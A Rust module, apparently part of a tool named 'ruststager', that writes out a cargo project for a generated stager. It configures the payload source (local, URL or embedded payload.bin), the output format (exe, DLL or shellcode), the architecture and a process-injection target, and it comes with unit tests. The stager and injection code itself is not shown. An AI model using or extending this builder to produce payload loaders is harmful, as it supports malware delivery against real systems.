//! Writes the cargo project of the generated program: a template copy, adjusted for the
//! chosen source, format, architecture and extra dependencies.
//!
//! The program's source (`src/stager.rs`) is never modified. Only these are rewritten:
//! * `Cargo.toml`: the target block between the `ruststager:target` markers, the
//!   `default = [...]` features line, and extra `--dep` lines;
//! * `.cargo/config.toml`: the `target = ...`, `RG_TARGET = ...`, and `INJECT_PROC = ...` lines;
//! * `payload.bin`: replaced by the embedded file.

use std::fs;
use std::path::Path;

use anyhow::{Context, Result, bail};

use crate::cli::{Arch, Format};
use crate::template::Template;

/// The file the generated program prints.
pub enum Source {
    Local(String),
    Url(String),
    Embed(std::path::PathBuf),
}

impl Source {
    fn feature(&self) -> &'static str {
        match self {
            Source::Local(_) => "local",
            Source::Url(_) => "url",
            Source::Embed(_) => "embed",
        }
    }
}

pub struct Spec<'a> {
    pub source: &'a Source,
    pub format: Format,
    pub arch: Arch,
    pub deps: &'a [String],
    /// Custom injection target process name (--pid). None uses the default fallback chain.
    pub inject_proc: Option<&'a str>,
}

const TARGET_BEGIN: &str = "# ruststager:target-begin";
const TARGET_END: &str = "# ruststager:target-end";

/// Writes the complete project into `dir` (which must exist and be empty or ours).
pub fn write(dir: &Path, template: &Template, spec: &Spec) -> Result<()> {
    template.write_to(dir)?;

    let manifest = dir.join("Cargo.toml");
    let text = read(&manifest)?;
    fs::write(&manifest, patch_manifest(&text, spec)?)?;

    let config = dir.join(".cargo").join("config.toml");
    let text = read(&config)?;
    fs::write(&config, patch_config(&text, spec)?)?;

    if let Source::Embed(file) = spec.source {
        fs::copy(file, dir.join("payload.bin"))
            .with_context(|| format!("cannot read file to embed {}", file.display()))?;
    }
    Ok(())
}

fn read(path: &Path) -> Result<String> {
    fs::read_to_string(path).with_context(|| format!("cannot read {}", path.display()))
}

fn patch_manifest(text: &str, spec: &Spec) -> Result<String> {
    // 1. Crate target: executable, cdylib for DLLs, or shellcode binary.
    if spec.format == Format::Shellcode && spec.arch != Arch::X86_64 {
        bail!("--format shellcode only supports x86_64");
    }
    let (src, is_dll) = match spec.format {
        Format::Exe      => ("src/stager.rs", false),
        Format::Dll      => ("src/stager.rs", true),
        Format::Shellcode => ("src/shellcode.rs", false),
    };
    let target = if is_dll {
        format!("[lib]\nname = \"stager\"\npath = \"{src}\"\ncrate-type = [\"cdylib\"]\ntest = false\nbench = false\n")
    } else {
        format!("[[bin]]\nname = \"stager\"\npath = \"{src}\"\ntest = false\nbench = false\n")
    };
    let (Some(begin), Some(end)) = (text.find(TARGET_BEGIN), text.find(TARGET_END)) else {
        bail!("template Cargo.toml lacks the `{TARGET_BEGIN}` / `{TARGET_END}` markers");
    };
    let begin = begin + TARGET_BEGIN.len();
    let begin = begin + text[begin..].find('\n').map(|i| i + 1).unwrap_or(0); // keep the marker line itself
    let mut out = format!("{}{}{}", &text[..begin], &target, &text[end..]);

    // 2. Default features: the source mode, plus `dll`.
    let mut features = vec![spec.source.feature()];
    if spec.format == Format::Dll {
        features.push("dll");
    }
    let list = features.iter().map(|f| format!("\"{f}\"")).collect::<Vec<_>>().join(", ");
    out = replace_line(&out, "default = ", &format!("default = [{list}]"))?;

    // 3. Extra dependencies, right after the [dependencies] header.
    if !spec.deps.is_empty() {
        let mut extra = String::from("[dependencies]\n# added with --dep\n");
        for dep in spec.deps {
            extra.push_str(dep.trim());
            extra.push('\n');
        }
        out = replace_line(&out, "[dependencies]", extra.trim_end())?;
    }
    Ok(out)
}

fn patch_config(text: &str, spec: &Spec) -> Result<String> {
    let mut out = replace_line(text, "target = ", &format!("target = {}", toml_str(spec.arch.triple())))?;
    if let Source::Local(s) | Source::Url(s) = spec.source {
        out = replace_line(&out, "RG_TARGET = ", &format!("RG_TARGET = {}", toml_str(s)))?;
    }
    if let Some(proc_name) = spec.inject_proc {
        out = replace_line(&out, "INJECT_PROC = ", &format!("INJECT_PROC = {}", toml_str(proc_name)))?;
    }
    Ok(out)
}

/// Replaces the first line starting with `prefix` (ignoring indentation) by `new`.
fn replace_line(text: &str, prefix: &str, new: &str) -> Result<String> {
    let mut found = false;
    let mut out = String::with_capacity(text.len() + new.len());
    for line in text.split_inclusive('\n') {
        if !found && line.trim_start().starts_with(prefix) {
            found = true;
            out.push_str(new);
            out.push_str(if line.ends_with("\r\n") { "\r\n" } else if line.ends_with('\n') { "\n" } else { "" });
        } else {
            out.push_str(line);
        }
    }
    if !found {
        bail!("template is missing a line starting with `{prefix}`");
    }
    Ok(out)
}

/// A TOML basic string literal.
fn toml_str(s: &str) -> String {
    let mut out = String::from("\"");
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            c if (c as u32) < 0x20 || c == '\x7f' => out.push_str(&format!("\\u{:04X}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    const MANIFEST: &str = include_str!("../template/Cargo.toml");
    const CONFIG: &str = include_str!("../template/.cargo/config.toml");

    /// The non-comment lines of a TOML file (the template's comments mention [[bin]] etc.).
    fn code(toml: &str) -> String {
        toml.lines().filter(|l| !l.trim_start().starts_with('#')).collect::<Vec<_>>().join("\n")
    }

    #[test]
    fn manifest_dll_with_deps() {
        let source = Source::Url("https://x".into());
        let deps = vec!["heapless = \"0.8\"".to_string()];
        let spec = Spec { source: &source, format: Format::Dll, arch: Arch::X86, deps: &deps, inject_proc: None };
        let out = patch_manifest(MANIFEST, &spec).unwrap();
        assert!(code(&out).contains("crate-type = [\"cdylib\"]"));
        assert!(!code(&out).contains("[[bin]]"));
        assert!(out.contains("default = [\"url\", \"dll\"]"));
        assert!(out.replace("\r\n", "\n").contains("[dependencies]\n# added with --dep\nheapless = \"0.8\"\n"));
        assert!(out.contains(TARGET_BEGIN) && out.contains(TARGET_END));
    }

    #[test]
    fn manifest_exe() {
        let source = Source::Embed("f".into());
        let spec = Spec { source: &source, format: Format::Exe, arch: Arch::X86_64, deps: &[], inject_proc: None };
        let out = patch_manifest(MANIFEST, &spec).unwrap();
        assert!(code(&out).contains("[[bin]]") && !code(&out).contains("cdylib"));
        assert!(out.contains("default = [\"embed\"]"));
    }

    #[test]
    fn config_escapes_target() {
        let source = Source::Local(r#"C:\dir "q"\é.txt"#.into());
        let spec = Spec { source: &source, format: Format::Exe, arch: Arch::Aarch64, deps: &[], inject_proc: None };
        let out = patch_config(CONFIG, &spec).unwrap();
        assert!(out.contains("target = \"aarch64-pc-windows-msvc\""));
        assert!(out.contains(r#"RG_TARGET = "C:\\dir \"q\"\\é.txt""#));
    }

    #[test]
    fn missing_line_is_an_error() {
        assert!(replace_line("a = 1\n", "b = ", "b = 2").is_err());
        assert_eq!(replace_line("a = 1\r\nb = 1\r\n", "b = ", "b = 2").unwrap(), "a = 1\r\nb = 2\r\n");
    }
}
